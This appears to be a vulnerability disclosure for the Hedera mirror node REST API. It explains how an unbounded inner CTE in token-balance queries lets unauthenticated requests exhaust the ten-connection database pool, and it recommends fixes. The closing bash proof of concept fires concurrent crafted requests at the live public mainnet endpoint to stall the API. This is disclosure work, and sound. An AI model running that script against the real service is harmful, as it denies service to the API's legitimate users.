### Title
Unbounded CTE Inner Query in `getTokenBalances` Enables DB Connection Pool Exhaustion DoS

### Summary
In `rest/tokens.js`, `extractSqlFromTokenBalancesRequest`, when a `timestamp` filter and an `account.balance` filter are both supplied, the inner CTE that resolves per-account balances carries **no LIMIT clause**. The LIMIT is applied only to the outer query after the balance predicate, meaning the database must materialise every matching row for the token before any row-count cap takes effect. Any unauthenticated caller can trigger this with `account.balance=gte:0` (which matches every account) combined with any timestamp, causing a full sequential scan of `token_balance` for the target token and exhausting the REST API's ten-connection DB pool.

### Finding Description

**Code path** — `rest/tokens.js`, `extractSqlFromTokenBalancesRequest`, lines 638–666:

```
// timestamp branch (lines 649-666)
query = `select distinct on (ti.account_id)
           ti.account_id, ti.balance, ...
         from token_balance as ti
         where ti.token_id = $1
           and ti.consensus_timestamp >= $lower
           and ti.consensus_timestamp <= $upper
         order by ti.account_id DESC, ti.consensus_timestamp desc`;
         // ← NO LIMIT here

if (balanceConditions.length) {
  query = `with ti as (${query})   // inner CTE is unlimited
           select * from ti
           where ti.balance >= $0  // balance filter applied AFTER full materialisation
           order by account_id DESC`;
}
query += `\nlimit $${params.push(limit)}`;  // LIMIT only on outer query
```

Contrast with the **no-timestamp branch** (lines 673–680), where the LIMIT is placed **inside** the CTE:

```
with filtered_token_accounts as (
  select ... from token_account as ti
  where ...
  order by ti.account_id DESC
  limit $N          // ← LIMIT applied early, before balance filter
)
```

**Root cause:** The two branches are asymmetric. The timestamp branch defers the LIMIT to the outer query so that the balance filter can be applied to the "latest balance as of the upper timestamp" (comment at line 659). This is semantically correct but structurally unbounded: the inner CTE must read every `(token_id, account_id)` pair in the timestamp window before the outer `WHERE` and `LIMIT` can act.

**Failed assumption:** The developer assumed the `statement_timeout` and the small default `limit` (25, max 100) would bound the work. They do not: the LIMIT never reaches the inner scan, and the timeout only caps wall-clock duration, not the number of connections held simultaneously.

### Impact Explanation

The REST API DB pool defaults to **10 connections** (`maxConnections: 10`, `rest/dbpool.js` line 14) with a **20-second statement timeout** (`statementTimeout: 20000`, `docs/configuration.md` line 557). A popular token on mainnet can have millions of `token_balance` rows. Each crafted request holds one pool connection for up to 20 seconds while PostgreSQL performs a full sequential scan. Ten concurrent requests saturate the pool; all other API endpoints (transactions, accounts, etc.) queue indefinitely or time out at the connection-acquisition layer. The mirror node becomes effectively unavailable for the duration of the attack. This is a **read-only API DoS** — the mirror node does not participate in Hedera consensus, so the "block delay" framing in the question title does not apply; the real impact is complete REST API unavailability.

### Likelihood Explanation

No authentication, API key, or rate limit is required. The endpoint is publicly documented. The attacker needs only a token ID with a large holder set (trivially discoverable from the same API) and the ability to send HTTP requests. The attack is repeatable at will: each wave of 10 concurrent requests re-saturates the pool as soon as the previous wave times out. Automation is trivial.

### Recommendation

1. **Apply the LIMIT inside the inner CTE** when the timestamp branch is taken, mirroring the no-timestamp branch. Accept that this means the balance filter may see fewer than `limit` rows after filtering, and handle pagination accordingly (e.g., keyset pagination on `account_id`).
2. **Add per-IP or per-endpoint rate limiting** at the application or ingress layer.
3. **Increase `maxConnections`** or introduce a query-queue with a short wait timeout so that pool exhaustion does not cascade to unrelated endpoints.
4. Consider enforcing a **minimum non-trivial balance filter** (e.g., reject `gte:0`) or requiring an `account.id` bound when a timestamp filter is present.

### Proof of Concept

```bash
# 1. Find a token with many holders (e.g., a stablecoin on mainnet)
TOKEN=0.0.456858   # example: large fungible token

# 2. Get any valid timestamp
TS=$(curl -s "https://mainnet-public.mirrornode.hedera.com/api/v1/tokens/${TOKEN}/balances?limit=1" \
     | jq -r '.timestamp')

# 3. Fire 10 concurrent requests, each triggering the unbounded CTE
for i in $(seq 1 10); do
  curl -s "https://mainnet-public.mirrornode.hedera.com/api/v1/tokens/${TOKEN}/balances\
?timestamp=lte:${TS}&account.balance=gte:0&limit=100" &
done
wait

# 4. While the above runs, observe that all other API calls stall:
curl -s "https://mainnet-public.mirrornode.hedera.com/api/v1/transactions?limit=1"
# → hangs or returns 503/timeout
```

Each of the 10 requests causes PostgreSQL to perform a full sequential scan of `token_balance` for the given token within the timestamp window (potentially millions of rows), holding a DB connection for up to 20 seconds. With the pool exhausted, all other REST API requests are blocked.